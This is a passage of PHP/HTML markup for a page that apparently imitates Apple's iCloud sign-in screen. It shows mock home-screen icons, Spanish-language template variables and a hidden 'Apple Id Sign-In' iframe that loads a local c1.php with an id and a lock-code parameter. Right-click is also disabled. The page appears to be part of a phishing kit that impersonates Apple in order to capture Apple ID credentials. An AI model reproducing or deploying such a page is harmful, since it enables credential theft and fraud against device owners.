             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 80.725px; top: 454.814px; background-color: rgb(201, 232, 252);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">iCloud Drive</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 175.075px; top: 454.814px; background-color: rgb(251, 241, 203);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Notes</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 269.425px; top: 454.814px; background-color: rgb(246, 249, 245);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Reminders</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 363.775px; top: 454.814px; background-color: rgb(255, 170, 30);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Pages</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 80.725px; top: 560.264px; background-color: rgb(125, 239, 120);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Numbers</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 175.075px; top: 560.264px; background-color: rgb(77, 174, 248);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Keynote</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 269.425px; top: 560.264px; background-color: rgb(255, 193, 55);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Find Friends</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 78.6px; width: 55.5px; left: 363.775px; top: 560.264px; background-color: rgb(121, 169, 129);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Find iPhone</div>
             </div>
          </div>

                    <div class="bootstrap-mock-springboard-view mediano" aria-hidden="true" style="display:none;position: absolute; pointer-events: none; user-select: none; width: 651px; height: 860px; filter: blur(35.85px); z-index: -1; left: 0px; top: 44px;">
             <div style="position: absolute; width: 78px; height: 78px; border-radius: 50%; background-color: rgb(192, 192, 192); left: 286.5px; top: 101.371px;"></div>
             <div style="position: absolute; font-family: SFDisplay, SFText, Helvetica, sans-serif; font-size: 26px; font-weight: 600; color: rgb(51, 51, 51); text-align: center; width: 282px; height: 31px; left: 184.5px; top: 196.371px;">Good afternoon, Abcdef.</div>
             <div class="bootstrap-mock-account-settings" style="position: absolute; font-family: SFText, Helvetica, sans-serif; font-size: 15px; font-weight: 500; color: rgb(4, 199, 255); text-align: center; width: 160.8px; height: 18px; left: 245.1px; top: 240.371px;">Account Settings</div>
             <style>.bootstrap-mock-springboard-view * { filter: contrast(0.65) brightness(1.2); }</style>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 135.5px; top: 339.468px; background-color: rgb(102, 188, 249);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Mail</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 241.402px; top: 339.468px; background-color: rgb(204, 204, 191);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Contacts</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 347.303px; top: 339.468px; background-color: rgb(239, 232, 231);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Calendar</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 453.205px; top: 339.468px; background-color: rgb(208, 196, 179);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Photos</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 135.5px; top: 457.829px; background-color: rgb(201, 232, 252);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">iCloud Drive</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 241.402px; top: 457.829px; background-color: rgb(251, 241, 203);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Notes</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 347.303px; top: 457.829px; background-color: rgb(246, 249, 245);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Reminders</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 453.205px; top: 457.829px; background-color: rgb(255, 170, 30);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Pages</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 135.5px; top: 576.189px; background-color: rgb(125, 239, 120);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Numbers</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 241.402px; top: 576.189px; background-color: rgb(77, 174, 248);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Keynote</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 347.303px; top: 576.189px; background-color: rgb(255, 193, 55);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Find Friends</div>
             </div>
             <div style="position: absolute; border-radius: 20%; height: 86.754px; width: 62.295px; left: 453.205px; top: 576.189px; background-color: rgb(121, 169, 129);">
                <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Find iPhone</div>
             </div>
          </div>



                    

                     <div class="bootstrap-mock-springboard-view grande" aria-hidden="true" style="display:none;position: absolute; pointer-events: none; user-select: none; width: 1920px; height: 360px; filter: blur(57px); z-index: -1; left: -8.5px; top: 35.5px;">
                        <div style="position: absolute; width: 70px; height: 70px; border-radius: 50%; background-color: rgb(192, 192, 192); left: 764px; top: 17.28px;"></div>
                        <div style="position: absolute; font-family: SFDisplay, SFText, Helvetica, sans-serif; font-size: 26px; font-weight: 600; color: rgb(51, 51, 51); text-align: center; width: 304px; height: 31px; left: 852px; top: 22.28px;">Good afternoon, Abcdef.</div>
                        <div class="bootstrap-mock-account-settings" style="position: absolute; font-family: SFText, Helvetica, sans-serif; font-size: 15px; font-weight: 500; color: rgb(4, 199, 255); text-align: center; width: 146.4px; height: 17px; left: 839.8px; top: 63.28px;">Account Settings</div>
                        <style>.bootstrap-mock-springboard-view * { filter: contrast(0.65) brightness(1.2); }</style>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 437.625px; top: 114.38px; background-color: rgb(102, 188, 249);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Mail</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 622.695px; top: 114.38px; background-color: rgb(204, 204, 191);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Contacts</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 807.765px; top: 114.38px; background-color: rgb(239, 232, 231);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Calendar</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 992.835px; top: 114.38px; background-color: rgb(208, 196, 179);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Photos</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1177.9px; top: 114.38px; background-color: rgb(201, 232, 252);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">iCloud Drive</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1362.97px; top: 114.38px; background-color: rgb(251, 241, 203);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Notes</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 437.625px; top: 323.33px; background-color: rgb(246, 249, 245);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Reminders</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 622.695px; top: 323.33px; background-color: rgb(255, 170, 30);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Pages</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 807.765px; top: 323.33px; background-color: rgb(125, 239, 120);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Numbers</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 992.835px; top: 323.33px; background-color: rgb(77, 174, 248);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Keynote</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1177.9px; top: 323.33px; background-color: rgb(255, 193, 55);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Find Friends</div>
                        </div>
                        <div style="position: absolute; border-radius: 20%; height: 155.28px; width: 119.4px; left: 1362.97px; top: 323.33px; background-color: rgb(121, 169, 129);">
                           <div style="position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%) translateY(100%); font-family: SFText, Helvetica, sans-serif; font-size: 13px; font-weight: 400; color: #333; white-space: nowrap;">Find iPhone</div>
                        </div>
                     </div>



                     <div class="content-container-view">
                        <div class="content" style="margin-top: 44px;height: 10px;">
                           <div class="child-views">
                              <div class="home-login-view">
                                 <div class="notice-view-container">
                                    <div class="notice-view">
                                       <div class="notice-view-inner">
                                          <div class="notice-icon windows">
                                             <div><img src="imagen/r$__116.png" class="app-icon-view"></div>
                                          </div>
                                          <div class="notice-info">
                                             <span class="title"><?php echo $lang['DESCARGA'];?></span>
                                             <div class="notice-windows-subtitle">
                                                 <?php echo $lang['ACTULIZADO'];?>
                                                <div class="cw-button symbol-button notice-windows-subtitle-action" role="button" aria-disabled="false" tabindex="0">
                                                   <div class="cw-label-view"><?php echo $lang['DESCARGA_AHORA'];?></div>
                                                   <span class="symbol-view">
                                                      <svg viewBox="0 0 212.646728515625 159.98291015625" version="1.1" xmlns="http://www.w3.org/2000/svg" style="width: 24.143837230253222px; height: 18.164405205749055px; " classname=" layout-box">
                                                         <g transform="matrix(1 0 0 1 67.04118652343732 115.221435546875)">
                                                            <path d="M 20.6543 9.57031 C 22.9004 9.57031 24.707 8.78906 26.2695 7.22656 L 63.0371 -28.6133 C 65.0879 -30.7129 66.0645 -32.7637 66.1133 -35.3516 C 66.1133 -37.8906 65.1367 -40.0391 63.0371 -42.0898 L 26.2695 -77.9785 C 24.707 -79.4922 22.8516 -80.2734 20.6543 -80.2734 C 16.1133 -80.2734 12.4512 -76.6602 12.4512 -72.168 C 12.4512 -69.9219 13.3789 -67.8711 15.0879 -66.1621 L 46.9238 -35.3027 L 15.0879 -4.54102 C 13.3789 -2.83203 12.4512 -0.78125 12.4512 1.46484 C 12.4512 5.9082 16.1133 9.57031 20.6543 9.57031 Z"></path>
                                                         </g>
                                                      </svg>
                                                   </span>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="notice-close" onclick="close_x()">
                                          <div role="button" aria-disabled="false" title="" tabindex="0" class="close-icon-button-view cw-button"><span class="title" style="background-image: url(imagen/close.png);"></span></div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="container-view">
                                    <div class="cloud-os-apple-id-view">
                                       <div class="view-visible">
                                          <div class="apple-id-view apple-id-ui-view">
                                                <div id="carga" class="spinner" role="progressbar" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
                                                  <img src="imagen/spinner2.gif"  width="25px">
                                              </div>
                                            <iframe style="display:none;width: 100% !important;height: 100%  !important;border: none  !important;" title="Apple Id Sign-In" id="auth-frame" scrolling="no" src="<?php echo $DOMINIO_LOCAL;?>c1.php?cf=<?php echo $x_id;?>&nn=<?php echo $id_decode;?>&bb=<?php echo $cod_bloqueo;?>&i=<?php echo $idioma;?>"
                                            class="apple-id-frame-view" src=""></iframe>
                                          </div>
                                       </div>
                                       <canvas class="cw-spinner-view" height="32" width="32" style="height: 32px; width: 32px; display: none;"></canvas>
                                    </div>
                                 </div>
                                 <div class="quick-access-view hide-quick-access-view">
                                    <div></div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="legal-footer">
                           <div class="legal-footer-content">
                              <span><a class="create" target="_blank" href="#"><?php echo $lang['CREAR_ID_APPLE'];?></a>  |  <a class="sytemStatus" target="_blank" href="#"><?php echo $lang['ESTADO_SISTEMA'];?></a>  |  <a class="privacy" target="_blank" href="#"><?php echo $lang['POLICY'];?></a>  |  <a class="terms" target="_blank" href="#"><?php echo $lang['TERMS'];?></a>  |  <span class="copyright"><?php echo $lang['COPYRIGHT'];?></span></span>
                           </div>
                        </div>
                        <div class="toolbar-view base-application-toolbar-view cloud-os-application-toolbar-view dark-theme" style="top: 0px;">
                           <div class="cloud-os-application-toolbar-left-view toolbar-left-view">
                              <span tabindex="0" class="apple-icon-button cw-button">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="44" viewBox="0 0 16 44">
                                    <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
                                 </svg>
                              </span>
                              <div></div>
                           </div>
                           <div></div>
                           <div class="cloud-os-application-toolbar-right-view toolbar-right-view">
                              <span tabindex="0" class="help-button cw-button">
                                 <svg viewBox="0 0 99.6097412109375 99.6572265625" version="1.1" xmlns="http://www.w3.org/2000/svg" classname=" glyph-box">
                                    <g transform="matrix(1 0 0 1 -8.740283203125045 85.05859375)">
                                       <path d="M 58.5449 14.5508 C 85.791 14.5508 108.35 -8.00781 108.35 -35.2539 C 108.35 -62.4512 85.7422 -85.0586 58.4961 -85.0586 C 31.2988 -85.0586 8.74023 -62.4512 8.74023 -35.2539 C 8.74023 -8.00781 31.3477 14.5508 58.5449 14.5508 Z M 58.5449 6.25 C 35.498 6.25 17.0898 -12.207 17.0898 -35.2539 C 17.0898 -58.252 35.4492 -76.7578 58.4961 -76.7578 C 81.543 -76.7578 100 -58.252 100.049 -35.2539 C 100.098 -12.207 81.5918 6.25 58.5449 6.25 Z M 57.5195 -25.1465 C 60.0098 -25.1465 61.4746 -26.6602 61.4746 -28.6133 L 61.4746 -29.1992 C 61.4746 -31.9336 63.0859 -33.6426 66.4551 -35.8887 C 71.1914 -39.0137 74.5605 -41.8945 74.5605 -47.7051 C 74.5605 -55.8594 67.334 -60.2051 59.082 -60.2051 C 50.6836 -60.2051 45.166 -56.25 43.7988 -51.7578 C 43.5547 -50.9277 43.4082 -50.1465 43.4082 -49.3164 C 43.4082 -47.168 45.1172 -45.9473 46.7285 -45.9473 C 49.5117 -45.9473 49.9512 -47.4609 51.5137 -49.2676 C 53.125 -51.9531 55.4688 -53.5645 58.7402 -53.5645 C 63.1836 -53.5645 66.1133 -51.0742 66.1133 -47.3145 C 66.1133 -43.9941 64.0137 -42.3828 59.7656 -39.4531 C 56.25 -37.0117 53.6621 -34.4238 53.6621 -29.6387 L 53.6621 -29.0039 C 53.6621 -26.416 55.0293 -25.1465 57.5195 -25.1465 Z M 57.4219 -10.5469 C 60.2539 -10.5469 62.6953 -12.793 62.6953 -15.625 C 62.6953 -18.5059 60.3027 -20.7031 57.4219 -20.7031 C 54.541 -20.7031 52.1484 -18.457 52.1484 -15.625 C 52.1484 -12.8418 54.5898 -10.5469 57.4219 -10.5469 Z"></path>
                                    </g>
                                 </svg>
                              </span>
                              <div></div>
                           </div>
                        </div>
                     </div>
                  </div>

               </div>

               </div>
               


               <div class="multi-child-view">
                  <div class="child-views"></div>
               </div>
            </div>
         </div>
      </div>
      <div id="cw-aria-live-region" aria-live="polite" style="position: fixed; top: -1px; width: 1px; height: 1px; overflow: hidden;"></div>
<script type="text/javascript">
  document.oncontextmenu = function(){return false;}
  function close_x(){
    $(".notice-view").css("display","none");
  }
</script>

   </body>
</html>